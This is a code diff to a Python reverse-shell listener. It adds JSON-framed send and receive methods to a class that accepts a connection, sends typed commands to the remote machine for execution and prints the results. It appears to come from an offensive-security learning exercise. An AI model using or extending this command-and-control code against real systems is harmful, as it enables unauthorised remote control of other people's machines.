@@ -1,4 +1,5 @@
 import socket
+import json
 
 
 class Listener:
@@ -10,19 +11,32 @@ class Listener:
         print('[+] Waiting for incoming connections')
         self.connection, address = listener.accept()
         print(f'[+] Got a connection from {address}')
-
         if start:
             self.run()
 
-    def execute_remotely(self, command):
-        command = command.encode()
-        self.connection.send(command)
-        return self.connection.recv(1024).decode(errors='replace')
+    def reliable_send(self, data):
+        json_data = json.dumps(data)  # str
+        json_data = json_data.encode()  # bytes
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = b''
+        while True:
+            try:
+                json_data += self.connection.recv(1024)  # bytes
+                json_data_str = json.loads(json_data)  # str
+                return json_data_str
+            except ValueError:
+                continue
+
+    def execute_remotely(self, command):  # str -> str
+        self.reliable_send(command)
+        return self.reliable_receive()
 
     def run(self):
         while True:
-            command = input('>> ')
-            result = self.execute_remotely(command)
+            command = input('>> ')  # str
+            result = self.execute_remotely(command)  # str
             print(result)
 
 
